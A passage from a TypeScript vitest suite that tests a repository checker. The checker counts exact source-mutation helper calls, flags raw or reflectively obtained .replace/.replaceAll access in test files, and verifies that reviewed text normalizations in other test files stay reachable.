        "fixture.test.ts",
        'replaceExactly("a", "a", "b"); replaceAllExactly("a", "a", "b"); "replaceIntegerAllExactly()";'
      )
    ).toBe(2);
    const exactCallCensusBaseline = exactMutationHelperCallCensus(
      "fixture.test.ts",
      'it("NEGATIVE: exact call", () => { replaceExactly(source, "old", "new"); });'
    );
    const exactCallCensusSameCountSwap = exactMutationHelperCallCensus(
      "fixture.test.ts",
      'it("NEGATIVE: exact call", () => { replaceExactly(source, "other", "new"); });'
    );
    const exactCallCensusDeadRelocation = exactMutationHelperCallCensus(
      "fixture.test.ts",
      'it("NEGATIVE: exact call", () => { if (false) { replaceExactly(source, "old", "new"); } });'
    );
    const exactCallRegistrationAuthority = exactMutationHelperCallCensus(
      "fixture.test.ts",
      'import { it } from "vitest";\nit("NEGATIVE: exact call", () => { replaceExactly(source, "old", "new"); });'
    );
    const forgedCallRegistrationAuthority = exactMutationHelperCallCensus(
      "fixture.test.ts",
      'import { it } from "forged";\nit("NEGATIVE: exact call", () => { replaceExactly(source, "old", "new"); });'
    );
    expect(exactCallCensusBaseline.count).toBe(1);
    expect(exactCallCensusSameCountSwap.count).toBe(1);
    expect(exactCallCensusDeadRelocation.count).toBe(1);
    expect(exactCallCensusSameCountSwap.sha256).not.toBe(exactCallCensusBaseline.sha256);
    expect(exactCallCensusDeadRelocation.sha256).not.toBe(exactCallCensusBaseline.sha256);
    expect(forgedCallRegistrationAuthority.count).toBe(exactCallRegistrationAuthority.count);
    expect(forgedCallRegistrationAuthority.sha256).not.toBe(exactCallRegistrationAuthority.sha256);
    expect(
      duplicateStringEntryKeys([
        ["duplicate.test.ts", 1],
        ["duplicate.test.ts", 2]
      ])
    ).toEqual(["duplicate.test.ts"]);
    expect(entryKeysOutside([["ghost.test.ts", 1]], new Set(["live.test.ts"]))).toEqual(["ghost.test.ts"]);
    expect(
      ownerlessReviewedTransformIds([
        { filename: "docs-consistency.test.ts", id: "reviewed docs special case" },
        { filename: "ghost-invariant.test.ts", id: "ownerless ordinary transform" }
      ])
    ).toEqual(["ownerless ordinary transform", "reviewed docs special case"]);

    const mutationCallSource = (call: ExactMutationHelperCallIdentity): string =>
      `${call.helper}(${call.sourceIdentifier}, ${JSON.stringify(call.needle)}, ${JSON.stringify(call.replacement)});`;
    const sameCountMissingRollback = [
      mutationCallSource(ABS_PATH_SHARED_WRITE_DELEGATE_MUTATIONS[0]),
      'replaceExactly(realVault, "unrelated authorized-looking target", "synthetic replacement");'
    ].join("\n");
    expect(exactMutationHelperCallCount("abs-path-leak-invariant.test.ts", sameCountMissingRollback)).toBe(2);
    expect(
      exactMutationHelperCallCount(
        "abs-path-leak-invariant.test.ts",
        sameCountMissingRollback,
        ABS_PATH_SHARED_WRITE_DELEGATE_MUTATIONS[0]
      )
    ).toBe(1);
    expect(
      exactMutationHelperCallCount(
        "abs-path-leak-invariant.test.ts",
        sameCountMissingRollback,
        ABS_PATH_SHARED_WRITE_DELEGATE_MUTATIONS[1]
      )
    ).toBe(0);

    const exactHelperImport =
      'import { replaceExactly } from "./helpers/exact-source-mutation.js";\n' +
      'replaceExactly("alpha", "alpha", "omega");';
    expect(exactMutationHelperBindingProblems("abs-path-leak-invariant.test.ts", exactHelperImport)).toEqual([]);
    const shadowedHelper =
      `${exactHelperImport}\n{ ` +
      'const replaceExactly = (source: string): string => source; replaceExactly("alpha"); }';
    expect(exactMutationHelperBindingProblems("abs-path-leak-invariant.test.ts", shadowedHelper)).toEqual([
      expect.stringMatching(/shadows exact mutation helper replaceExactly/)
    ]);
    expect(
      exactMutationHelperBindingProblems(
        "abs-path-leak-invariant.test.ts",
        'import { replaceExactly as mutate } from "./helpers/exact-source-mutation.js"; mutate("alpha");'
      )
    ).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/aliases exact mutation helper replaceExactly as mutate/),
        expect.stringMatching(/expected exact helper imports replaceExactly, found/)
      ])
    );

    const mutationInventoryFile = "abs-path-leak-invariant.test.ts";
    expect(
      repositoryMutationOracleProblems(
        mutationInventoryFile,
        "type Replacer = Parameters<typeof String.prototype.replace>[1];"
      )
    ).toEqual([]);
    expect(repositoryMutationOracleProblems(mutationInventoryFile, '// value.replace("old", "new")')).toEqual([]);
    for (const rawAccess of [
      'const weakened = source.replace("old", "new");',
      'const weakened = source["replaceAll"]("old", "new");',
      'const weakened = source["re" + "place"]("old", "new");',
      'const rawMutation = source[("replace")];',
      "const rawMutation = source.replace;",
      'const { ["replace"]: rawMutation } = source;',
      "const { replaceAll: rawMutation } = source;",
      '({ ["re" + "place"]: rawMutation } = source);',
      "({ replace } = source);",
      "for ({ replaceAll: rawMutation } of sources) {}",
      "for ({ replace: rawMutation } in sources) {}",
      "const rawMutation = String.prototype.replace;",
      'function replaceExactly(source: string): string { return source.replace("old", "new"); }'
    ]) {
      expect(repositoryMutationOracleProblems(mutationInventoryFile, rawAccess)).toEqual([
        expect.stringMatching(/unclassified raw \.(?:replace|replaceAll) (?:access|(?:assignment )?binding)/)
      ]);
    }
    expect(
      repositoryMutationOracleProblems(
        mutationInventoryFile,
        'const method = "replace";\nconst weakened = source[method]("old", "new");'
      )
    ).toEqual([expect.stringMatching(/unclassified raw \.replace access/)]);
    for (const reflectiveRawAccess of [
      'const rawMutation = Reflect.get(source, "replace");',
      'declare const Reflect: { get(target: unknown, key: PropertyKey): unknown }; Reflect.get(source, "replace");',
      'import type Reflect = require("safe"); Reflect.get(source, "replace");',
      'const method = "re" + "place"; const rawMutation = Reflect.get(source, method);',
      'const rawMutation = Object.getOwnPropertyDescriptor(source, "replace")?.value;',
      'declare const Object: { getOwnPropertyDescriptor(target: unknown, key: PropertyKey): PropertyDescriptor | undefined }; Object.getOwnPropertyDescriptor(source, "replaceAll")?.value;',
      'const method = "replaceAll"; const rawMutation = Reflect.getOwnPropertyDescriptor(source, method)?.value;',
      'Reflect.apply(Reflect.get(source, "replace"), source, ["old", "new"]);',
      'const getter = Reflect["get"]; getter(source, "replace");',
      'const key = "get"; const getter = Reflect[key]; getter(source, "replaceAll");',
      'let getter = Reflect.get; getter(source, "replace");',
      'let getter; getter = Reflect.get; getter(source, "replaceAll");',
      'let getter = () => "safe"; getter = Reflect.get; getter(source, "replace");',
      'const getter = Reflect.get.bind(Reflect); getter(source, "replaceAll");',
      'const getter = Reflect.get.bind(); getter(source, "replace");',
      'let alias; let getter; getter = alias = Reflect.get; getter(source, "replace");',
      'let getter; ({ get: getter } = Reflect); getter(source, "replaceAll");',
      'let getter; ({ get: getter = () => "safe" } = Reflect); getter(source, "replace");',
      'let getter; ({ get: getter = Reflect.get } = {}); getter(source, "replaceAll");',
      'let getter; ({ getter = Reflect.get } = {}); getter(source, "replace");',
      'let getter; getter ||= Reflect.get; getter(source, "replace");',
      'let getter; getter ??= Reflect.get; getter(source, "replaceAll");',
      'let getter = Reflect.get; getter &&= Reflect.get; getter(source, "replace");',
      'let getter = Reflect.get; (getter ||= () => "safe")(source, "replace");',
      'const getter = (0, Reflect.get); getter(source, "replace");',
      'const getter = Reflect.get || (() => "safe"); getter(source, "replaceAll");',
      'const R = Reflect; const getter = R.get; getter(source, "replace");',
      'let R = Reflect; const getter = R.get; getter(source, "replaceAll");',
      'let R = Reflect; const getter = (R ||= {}).get; getter(source, "replace");',
      'const getter = (0, Reflect).get; getter(source, "replaceAll");',
      'const { get: getter } = Reflect; getter(source, "replace");',
      'const { get: getter = Reflect.get } = {}; getter(source, "replace");',
      'const { getter = Reflect.get } = {}; getter(source, "replaceAll");',
      'let { get: getter } = Reflect; getter(source, "replaceAll");',
      'let { get: getter } = { get: () => "safe" }; getter = Reflect.get; getter(source, "replace");',
      'const descriptor = Object.getOwnPropertyDescriptor; descriptor(source, "replace")?.value;',
      'const { getOwnPropertyDescriptor: descriptor } = Object; descriptor(source, "replaceAll")?.value;',
      'const getter = globalThis.Reflect.get; getter(source, "replace");',
      'const descriptor = globalThis.Object.getOwnPropertyDescriptor; descriptor(source, "replace")?.value;',
      'Reflect.get.call(Reflect, source, "replace");',
      'Reflect.get.apply(Reflect, [source, "replace"]);',
      'Reflect["get"]["apply"](Reflect, [source, "replaceAll"]);',
      'Object.getOwnPropertyDescriptor.call(Object, source, "replace")?.value;',
      'Reflect.apply(Reflect.get, Reflect, [source, "replace"]);'
    ]) {
      expect(
        repositoryMutationOracleProblems(mutationInventoryFile, reflectiveRawAccess),
        reflectiveRawAccess
      ).toEqual([
        expect.stringMatching(/reflectively acquires raw \.(?:replace|replaceAll)/)
      ]);
    }
    for (const reviewedReflectiveAccess of [
      'const value = Reflect.get(target, property, target);',
      'const value = Reflect.get(source, "includes");',
      'const Reflect = { get: () => "safe" }; Reflect.get(source, "replace");',
      'import Reflect = require("safe"); Reflect.get(source, "replace");',
      'const globalThis = { Reflect: { get: () => "safe" } }; globalThis.Reflect.get(source, "replace");',
      'const method = "replace"; { const method = "includes"; Reflect.get(source, method); }',
      'const getter = Reflect.get; { const getter = () => "safe"; getter(source, "replace"); }',
      'let getter = () => "safe"; getter(source, "replace");',
      'const getter = (() => "safe").bind(null); getter(source, "replace");',
      'const getter = Reflect.get.bind(Reflect, source, "includes"); getter();',
      'let getter; ({ get: getter } = { get: () => "safe" }); getter(source, "replace");',
      'let getter; ({ get: getter = () => "safe" } = {}); getter(source, "replace");',
      'let getter; ({ getter = () => "safe" } = {}); getter(source, "replace");',
      'let getter; getter ||= () => "safe"; getter(source, "replace");',
      'let getter; (getter ||= () => "safe")(source, "replace");',
      'let R; const getter = (R ||= { get: () => "safe" }).get; getter(source, "replace");',
      'const getter = (0, () => "safe"); getter(source, "replace");',
      'const getter = undefined || (() => "safe"); getter(source, "replace");',
      'const getter = (0, { get: () => "safe" }).get; getter(source, "replace");',
      'const getter = Reflect.get; const value = getter(source, property); void value;',
      'const descriptor = Object.getOwnPropertyDescriptor(source, property); void descriptor;',
      'const iterator = Array.prototype[Symbol.iterator]; Reflect.apply(iterator, [], []);',
      'declare const Symbol: SymbolConstructor; const iterator = source[Symbol.iterator]; Reflect.apply(iterator, source, []);',
      'Reflect.get.call(Reflect, source, "includes");',
      'Reflect.get.apply(Reflect, [source, "includes"]);',
      'Reflect["get"]["apply"](Reflect, [source, "includes"]);',
      [
        "const proxy = new Proxy(target, {",
        "  get(target, property) {",
        "    const value = Reflect.get(target, property, target);",
        '    return typeof value === "function" ? value.bind(target) : value;',
        "  }",
        "});",
        "void proxy;"
      ].join("\n")
    ]) {
      expect(repositoryMutationOracleProblems(mutationInventoryFile, reviewedReflectiveAccess)).toEqual([]);
    }
    for (const dynamicReflectiveInvocation of [
      'Reflect.get(source, property)("old", "new");',
      'const rawMutation = Reflect.get(source, property); rawMutation("old", "new");',
      'const getter = Reflect.get; const rawMutation = getter(source, property); rawMutation.call(source, "old", "new");',
      'Reflect.apply(Reflect.get(source, property), source, ["old", "new"]);',
      'const apply = Reflect.apply; apply(Reflect.get(source, property), source, ["old", "new"]);',
      'const descriptor = Object.getOwnPropertyDescriptor(source, property); descriptor.value("old", "new");',
      'const { value } = Reflect.getOwnPropertyDescriptor(source, property); value("old", "new");',
      'const rawMutation = Reflect.get(source, property); const bound = rawMutation.bind(source); bound("old", "new");',
      'Reflect.get.call(Reflect, source, property)("old", "new");',
      'Reflect.get.apply(Reflect, [source, property])("old", "new");',
      'Reflect["get"]["apply"](Reflect, [source, property])("old", "new");',
      'Reflect.apply(Reflect.get, Reflect, [source, property])("old", "new");',
      'const getter = Reflect.get.bind(Reflect); getter(source, property)("old", "new");',
      'let getter; ({ get: getter } = Reflect); getter(source, property)("old", "new");',
      'const Symbol = { iterator: getMethod() }; const rawMutation = source[Symbol.iterator]; Reflect.apply(rawMutation, source, []);'
    ]) {
      expect(repositoryMutationOracleProblems(mutationInventoryFile, dynamicReflectiveInvocation)).toEqual([
        expect.stringMatching(/invokes a value extracted from an unresolved dynamic computed method/)
      ]);
    }
    expect(repositoryMutationOracleProblems(mutationInventoryFile, 'source[getMethod()]("old", "new");')).toEqual([
      expect.stringMatching(/dynamic computed method access; replace\/replaceAll cannot be excluded/)
    ]);
    expect(repositoryMutationOracleProblems(mutationInventoryFile, 'source[getMethod()]`old`;')).toEqual([
      expect.stringMatching(/dynamic computed method access; replace\/replaceAll cannot be excluded/)
    ]);
    for (const knownSafeComputedCall of [
      'source["includes"]("needle");',
      'const method = "includes"; source[method]("needle");',
      'source["includes"]`needle`;'
    ]) {
      expect(repositoryMutationOracleProblems(mutationInventoryFile, knownSafeComputedCall)).toEqual([]);
    }
    for (const extractedDynamicMethod of [
      'const rawMutation = source[getMethod()]; rawMutation.call(source, "old", "new");',
      'let rawMutation; rawMutation = source[getMethod()]; rawMutation("old", "new");',
      'let alias; let rawMutation; rawMutation = alias = source[getMethod()]; rawMutation("old", "new");',
      'let rawMutation; rawMutation ||= source[getMethod()]; rawMutation("old", "new");',
      'let rawMutation = source[getMethod()]; (rawMutation ||= () => "safe")("old", "new");',
      'const rawMutation = (0, source[getMethod()]); rawMutation.call(source, "old", "new");',
      'const rawMutation = source[getMethod()]; const alias = rawMutation; alias.apply(source, ["old", "new"]);',
      'const invoke = (fn) => fn.call(source, "old", "new"); invoke(source[getMethod()]);',
      'const invoke = ((fn) => fn.call(source, "old", "new")); invoke(source[getMethod()]);',
      'const invoke = (fn) => fn.call(source, "old", "new"); const alias = invoke; alias(source[getMethod()]);',
      'const invoke = (fn) => fn.call(source, "old", "new"); let alias; alias = invoke; alias(source[getMethod()]);',
      '({ rawMutation: source[getMethod()] }).rawMutation("old", "new");',
      'const key = "rawMutation"; ({ rawMutation: () => "safe", [key]: source[getMethod()] }).rawMutation("old", "new");',
      'const holder = { rawMutation: source[getMethod()] }; holder.rawMutation("old", "new");',
      'const rawMutation = source[getMethod()]; const holder = { rawMutation }; holder.rawMutation("old", "new");',
      'const rawMutation = source[getMethod()]; const holder = { rawMutation }; holder["rawMutation"]("old", "new");',
      'const rawMutation = source[getMethod()]; const holder = { rawMutation }; holder["rawMutation"].call(source, "old", "new");',
      'const rawMutation = source[getMethod()]; ({ rawMutation }).rawMutation("old", "new");',
      'const key = "rawMutation"; const holder = { [key]: source[getMethod()] }; holder.rawMutation("old", "new");',
      'const key = "rawMutation"; const holder = {}; holder[key] = source[getMethod()]; holder.rawMutation("old", "new");',
      'const holder = { rawMutation: source[getMethod()] }; const alias = holder; alias.rawMutation("old", "new");',
      'const holder = {}; const alias = holder; alias.rawMutation = source[getMethod()]; holder.rawMutation("old", "new");',
      'const holder = { rawMutation: source[getMethod()] }; const { rawMutation } = holder; rawMutation("old", "new");',
      'const key = "rawMutation"; const holder = { rawMutation: source[getMethod()] }; const { [key]: fn } = holder; fn("old", "new");',
      'let rawMutation; const holder = { rawMutation: source[getMethod()] }; ({ rawMutation } = holder); rawMutation("old", "new");',
      'let rawMutation; const holder = { rawMutation: source[getMethod()] }; ({ rawMutation: rawMutation = () => "safe" } = holder); rawMutation("old", "new");',
      'let rawMutation; ({ rawMutation: rawMutation = source[getMethod()] } = {}); rawMutation("old", "new");',
      'let rawMutation; ({ rawMutation = source[getMethod()] } = {}); rawMutation("old", "new");',
      'const { rawMutation = source[getMethod()] } = {}; rawMutation("old", "new");',
      'const key = "rawMutation"; let fn; const holder = { rawMutation: source[getMethod()] }; ({ [key]: fn } = holder); fn("old", "new");',
      'const invoke = ({ rawMutation }) => rawMutation("old", "new"); const holder = { rawMutation: source[getMethod()] }; invoke(holder);',
      'const rawMutation = source[getMethod()]; rawMutation`old`;',
      'const rawMutation = source[getMethod()]; const bound = rawMutation.bind(source); bound`old`;',
      'function select() { return source[getMethod()]; } select().call(source, "old", "new");',
      'const select = () => source[getMethod()]; const alias = select; alias().call(source, "old", "new");',
      'const select = function named() { return source[getMethod()]; }; const alias = select; alias().call(source, "old", "new");',
      'let holder; const rawMutation = (holder = { rawMutation: source[getMethod()] }).rawMutation; rawMutation("old", "new");',
      'let holder; const rawMutation = (holder ||= { rawMutation: source[getMethod()] }).rawMutation; rawMutation("old", "new");'
    ]) {
      expect(repositoryMutationOracleProblems(mutationInventoryFile, extractedDynamicMethod)).toEqual([
        expect.stringMatching(/invokes a value extracted from an unresolved dynamic computed method/)
      ]);
    }
    const safelyShadowedDynamicMethod = [
      "const rawMutation = source[getMethod()];",
      "{",
      '  const rawMutation = () => "safe";',
      "  rawMutation();",
      "}"
    ].join("\n");
    expect(repositoryMutationOracleProblems(mutationInventoryFile, safelyShadowedDynamicMethod)).toEqual([]);
    expect(
      repositoryMutationOracleProblems(
        mutationInventoryFile,
        'let rawMutation; rawMutation ||= () => "safe"; rawMutation("old", "new");'
      )
    ).toEqual([]);
    expect(
      repositoryMutationOracleProblems(
        mutationInventoryFile,
        'let rawMutation; (rawMutation ||= () => "safe")("old", "new");'
      )
    ).toEqual([]);
    expect(
      repositoryMutationOracleProblems(
        mutationInventoryFile,
        'const rawMutation = (0, () => "safe"); rawMutation("old", "new");'
      )
    ).toEqual([]);
    expect(
      repositoryMutationOracleProblems(
        mutationInventoryFile,
        'let rawMutation; ({ rawMutation: rawMutation = () => "safe" } = {}); rawMutation("old", "new");'
      )
    ).toEqual([]);
    expect(
      repositoryMutationOracleProblems(
        mutationInventoryFile,
        'let rawMutation; ({ rawMutation = () => "safe" } = {}); rawMutation("old", "new");'
      )
    ).toEqual([]);
    expect(
      repositoryMutationOracleProblems(
        mutationInventoryFile,
        'let holder; const rawMutation = (holder ||= { rawMutation: () => "safe" }).rawMutation; rawMutation("old", "new");'
      )
    ).toEqual([]);
    expect(
      repositoryMutationOracleProblems(
        mutationInventoryFile,
        'const invoke = ((fn) => fn.call(source, "old", "new")); invoke(() => "safe");'
      )
    ).toEqual([]);
    expect(
      repositoryMutationOracleProblems(
        mutationInventoryFile,
        'const key = "rawMutation"; ({ rawMutation: () => "safe", [key]: () => "also safe" }).rawMutation("old", "new");'
      )
    ).toEqual([]);
    expect(
      repositoryMutationOracleProblems(
        mutationInventoryFile,
        'const holder = {}; const alias = holder; alias.rawMutation = () => "safe"; holder.rawMutation("old", "new");'
      )
    ).toEqual([]);
    const safelyShadowedDynamicProperty = [
      "const holder = { rawMutation: source[getMethod()] };",
      "{",
      '  const holder = { rawMutation: () => "safe" };',
      '  holder.rawMutation("old", "new");',
      "}"
    ].join("\n");
    expect(repositoryMutationOracleProblems(mutationInventoryFile, safelyShadowedDynamicProperty)).toEqual([]);
    const safelyShadowedShorthandProperty = [
      "const rawMutation = source[getMethod()];",
      "{",
      '  const rawMutation = () => "safe";',
      "  const holder = { rawMutation };",
      '  holder.rawMutation("old", "new");',
      "}"
    ].join("\n");
    expect(repositoryMutationOracleProblems(mutationInventoryFile, safelyShadowedShorthandProperty)).toEqual([]);
    const safelyShadowedDestructuredProperty = [
      "const holder = { rawMutation: source[getMethod()] };",
      "{",
      '  const holder = { rawMutation: () => "safe" };',
      "  const { rawMutation } = holder;",
      '  rawMutation("old", "new");',
      "}"
    ].join("\n");
    expect(repositoryMutationOracleProblems(mutationInventoryFile, safelyShadowedDestructuredProperty)).toEqual([]);
    const safelyShadowedDynamicReturn = [
      "const select = () => source[getMethod()];",
      "{",
      '  const select = () => () => "safe";',
      "  const alias = select;",
      '  alias().call(source, "old", "new");',
      "}"
    ].join("\n");
    expect(repositoryMutationOracleProblems(mutationInventoryFile, safelyShadowedDynamicReturn)).toEqual([]);
    const safelyShadowedDynamicParameter = [
      'const invoke = (fn) => fn.call(source, "old", "new");',
      "{",
      '  const invoke = (value) => "safe";',
      "  const alias = invoke;",
      "  alias(source[getMethod()]);",
      "}"
    ].join("\n");
    expect(repositoryMutationOracleProblems(mutationInventoryFile, safelyShadowedDynamicParameter)).toEqual([]);
    const safelyShadowedDestructuredParameter = [
      'const invoke = ({ rawMutation }) => rawMutation("old", "new");',
      "{",
      "  const invoke = ({ value }) => value;",
      "  invoke({ value: source[getMethod()] });",
      "}"
    ].join("\n");
    expect(repositoryMutationOracleProblems(mutationInventoryFile, safelyShadowedDestructuredParameter)).toEqual([]);

    const unreachableReviewedTransform = [
      "function stripComments(src: string): string {",
      "  if (false) {",
      '    return src.replace(/\\/\\*[\\s\\S]*?\\*\\//g, "");',
      "  }",
      "  return src;",
      "}"
    ].join("\n");
    expect(
      repositoryMutationOracleProblems("entrypoint-guard-invariant.test.ts", unreachableReviewedTransform)
    ).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/unclassified raw \.replace access/),
        "entrypoint-guard-invariant.test.ts expected exactly one entrypoint block-comment stripping, found 0",
        "entrypoint-guard-invariant.test.ts expected exactly one entrypoint line-comment stripping, found 0"
      ])
    );
    const reachableButUnusedReviewedTransforms = [
      "function stripComments(src: string): string {",
      '  src.replace(/\\/\\*[\\s\\S]*?\\*\\//g, "");',
      '  return src.replace(/(^|[^:])\\/\\/[^\\n]*/g, "$1");',
      "}"
    ].join("\n");
    expect(
      repositoryMutationOracleProblems("entrypoint-guard-invariant.test.ts", reachableButUnusedReviewedTransforms)
    ).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/unclassified raw \.replace access/),
        "entrypoint-guard-invariant.test.ts expected exactly one entrypoint block-comment stripping, found 0",
        "entrypoint-guard-invariant.test.ts expected exactly one entrypoint line-comment stripping, found 0"
      ])
    );

    const entrypointSource = await fs.readFile(
      path.join(repoRoot, "tests/entrypoint-guard-invariant.test.ts"),
      "utf8"
    );
    expect(repositoryMutationOracleProblems("entrypoint-guard-invariant.test.ts", entrypointSource)).toEqual([]);
    const severedEntrypointConsumer = replaceExactly(
      entrypointSource,
      [
        '      const code = stripComments(await fs.readFile(path.join(scriptsDir, f), "utf8"));',
        "      if (RAW_URL_GUARD.test(code)) offenders.push(f);"
      ].join("\n"),
      [
        '      const code = await fs.readFile(path.join(scriptsDir, f), "utf8");',
        "      if (RAW_URL_GUARD.test(code)) offenders.push(f);"
      ].join("\n")
    );
    expect(
      repositoryMutationOracleProblems("entrypoint-guard-invariant.test.ts", severedEntrypointConsumer)
    ).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/unclassified raw \.replace access/),
        "entrypoint-guard-invariant.test.ts expected exactly one entrypoint block-comment stripping, found 0",
        "entrypoint-guard-invariant.test.ts expected exactly one entrypoint line-comment stripping, found 0"
      ])
    );
    const entrypointHeaderDrift = replaceExactly(
      entrypointSource,
      "// v3.11.6-rc.20 (external audit L-1) + rc.21 (rc.20 re-sweep F2) — script CLI",
      "// v3.11.6-rc.20 (external audit L-1) + rc.21 (rc.20 re-sweep F2) — script CLX"
    );
    expect(repositoryMutationOracleProblems("entrypoint-guard-invariant.test.ts", entrypointHeaderDrift)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/unclassified raw \.replace access/),
        "entrypoint-guard-invariant.test.ts expected exactly one entrypoint block-comment stripping, found 0",
        "entrypoint-guard-invariant.test.ts expected exactly one entrypoint line-comment stripping, found 0"
      ])
    );

    const docsConsistencySource = await fs.readFile(path.join(repoRoot, "tests/docs-consistency.test.ts"), "utf8");
    expect(repositoryMutationOracleProblems("docs-consistency.test.ts", docsConsistencySource)).toEqual([]);
    expect(repositoryMutationOracleProblems("docs-consistency.test.ts", "")).toEqual([
      "docs-consistency.test.ts expected exactly one pdf OCR quote normalization, found 0",
      "docs-consistency.test.ts expected exactly one pdf OCR whitespace normalization, found 0",
      "docs-consistency.test.ts expected exactly one lifecycle whitespace normalization, found 0",
      "docs-consistency.test.ts expected exactly one release gate parenthesis unescape, found 0"
    ]);
    const docsEarlyReturnAfterOcr = replaceExactly(
      docsConsistencySource,
      "  const ocr = normalize(ocrPdf);\n  const problems: string[] = [];",
      "  const ocr = normalize(ocrPdf);\n  return [];\n  const problems: string[] = [];"
    );
    expect(repositoryMutationOracleProblems("docs-consistency.test.ts", docsEarlyReturnAfterOcr)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/unclassified raw \.replace access/),
        "docs-consistency.test.ts expected exactly one pdf OCR quote normalization, found 0",
        "docs-consistency.test.ts expected exactly one pdf OCR whitespace normalization, found 0"
      ])
    );

    for (const mutation of [
      {
        expectedMissing: "pdf OCR quote normalization",
        needle: 'const normalizedQuotes = text.replace(/["\'`]/g, "");',
        replacement: 'const normalizedQuotes = text.replace(/[a-z]/g, "");'
      },
      {
        expectedMissing: "pdf OCR whitespace normalization",
        needle: 'const normalizedWhitespace = normalizedQuotes.replace(/\\s+/g, " ");',
        replacement: 'const normalizedWhitespace = normalizedQuotes.replace(/\\s*/g, " ");'
      },
      {
        expectedMissing: "lifecycle whitespace normalization",
        needle: 'const normalizedLifecycle = lifecycle.replace(/\\s+/g, " ");',
        replacement: 'const normalizedLifecycle = lifecycle.replace(/\\s*/g, " ");'
      },
      {
        expectedMissing: "release gate parenthesis unescape",
        needle: 'const unescapedGate = gate.replace(/\\\\([()])/g, "$1");',
        replacement: 'const unescapedGate = gate.replace(/\\\\([()])/g, "");'
      }
    ]) {
      expect(
        repositoryMutationOracleProblems(
          "docs-consistency.test.ts",
          replaceExactly(docsConsistencySource, mutation.needle, mutation.replacement)
        )
      ).toEqual(
        expect.arrayContaining([
          expect.stringMatching(/unclassified raw \.replace access/),
          `docs-consistency.test.ts expected exactly one ${mutation.expectedMissing}, found 0`
        ])
      );
    }

    const dynamicAliasWithDeadDecoy = replaceExactly(
      docsConsistencySource,
      'const normalizedQuotes = text.replace(/["\'`]/g, "");',
      'const rawReplaceMethod = "replace";\n' +
        '    const normalizedQuotes = text[rawReplaceMethod](/["\'`]/g, "");\n' +
        "    if (false) {\n" +
        '      const normalizedQuotes = text.replace(/["\'`]/g, "");\n' +
        "      void normalizedQuotes;\n" +
        "    }"
    );
    expect(repositoryMutationOracleProblems("docs-consistency.test.ts", dynamicAliasWithDeadDecoy)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/unclassified raw \.replace access/),
        "docs-consistency.test.ts expected exactly one pdf OCR quote normalization, found 0"
      ])
    );

    const relocatedGate = replaceExactly(
      docsConsistencySource,
      'const unescapedGate = gate.replace(/\\\\([()])/g, "$1");',
      'if (false) {\n        const unescapedGate = gate.replace(/\\\\([()])/g, "$1");\n        void unescapedGate;\n      }'
    );
    expect(repositoryMutationOracleProblems("docs-consistency.test.ts", relocatedGate)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/unclassified raw \.replace access/),
        "docs-consistency.test.ts expected exactly one release gate parenthesis unescape, found 0"
      ])
    );

    for (const receiverMutation of [
      '"lint|test \\(22\\)|test \\(24\\)|smoke|audit|coverage|version-consistency|docs|oia|protocol-conformance|package-consumer|mcpb-basic|docker".split("|")',
      "([] as string[])"
    ]) {
      const detachedGateReceiver = replaceExactly(docsConsistencySource, '(m[1] ?? "").split("|")', receiverMutation);
      expect(repositoryMutationOracleProblems("docs-consistency.test.ts", detachedGateReceiver)).toEqual(
        expect.arrayContaining([
          expect.stringMatching(/unclassified raw \.replace access/),
          "docs-consistency.test.ts expected exactly one release gate parenthesis unescape, found 0"
        ])
      );
    }

    const unreachablePdfNormalize = replaceExactly(
      docsConsistencySource,
      "  };\n  const read = normalize(readPdf);",
      "  };\n  return [];\n  const read = normalize(readPdf);"
    );
    expect(repositoryMutationOracleProblems("docs-consistency.test.ts", unreachablePdfNormalize)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/unclassified raw \.replace access/),
        "docs-consistency.test.ts expected exactly one pdf OCR quote normalization, found 0",
        "docs-consistency.test.ts expected exactly one pdf OCR whitespace normalization, found 0"
      ])
    );

    const lifecycleContractLoop = [
      "    for (const contract of [",
      ...REVIEWED_LIFECYCLE_CONTRACTS.map(
        (contract, index) =>
          `      ${JSON.stringify(contract)}${index === REVIEWED_LIFECYCLE_CONTRACTS.length - 1 ? "" : ","}`
      ),
      "    ]) {"
    ].join("\n");
    const lifecycleEmptyIterable = replaceExactly(
      docsConsistencySource,
      lifecycleContractLoop,
      "    for (const contract of []) {"
    );
    expect(repositoryMutationOracleProblems("docs-consistency.test.ts", lifecycleEmptyIterable)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/unclassified raw \.replace access/),
        "docs-consistency.test.ts expected exactly one lifecycle whitespace normalization, found 0"
      ])
    );

    const lifecycleReassignment = replaceExactly(
      replaceExactly(
        docsConsistencySource,
        'const lifecycle = lifecycleMatch?.[1] ?? "";',
        'let lifecycle = lifecycleMatch?.[1] ?? "";'
      ),
      'const normalizedLifecycle = lifecycle.replace(/\\s+/g, " ");',
      `lifecycle = ${JSON.stringify(REVIEWED_LIFECYCLE_CONTRACTS.join(" "))};\n    ` +
        'const normalizedLifecycle = lifecycle.replace(/\\s+/g, " ");'
    );
    expect(repositoryMutationOracleProblems("docs-consistency.test.ts", lifecycleReassignment)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/unclassified raw \.replace access/),
        "docs-consistency.test.ts expected exactly one lifecycle whitespace normalization, found 0"
      ])
    );

    const unreachableReviewedSet =
      "if (false) {\n" +
      '  const normalizedQuotes = text.replace(/["\'`]/g, "");\n' +
      '  const normalizedWhitespace = normalizedQuotes.replace(/\\s+/g, " ");\n' +
      '  const normalizedLifecycle = lifecycle.replace(/\\s+/g, " ");\n' +
      '  const unescapedGate = gate.replace(/\\\\([()])/g, "$1");\n' +
      "}";
    expect(repositoryMutationOracleProblems("docs-consistency.test.ts", unreachableReviewedSet)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/unclassified raw \.replace access/),
        "docs-consistency.test.ts expected exactly one pdf OCR quote normalization, found 0",
        "docs-consistency.test.ts expected exactly one pdf OCR whitespace normalization, found 0",
        "docs-consistency.test.ts expected exactly one lifecycle whitespace normalization, found 0",
        "docs-consistency.test.ts expected exactly one release gate parenthesis unescape, found 0"
      ])
    );

    const files = await collectInvariantTestFiles();
    expect(
      files.length,
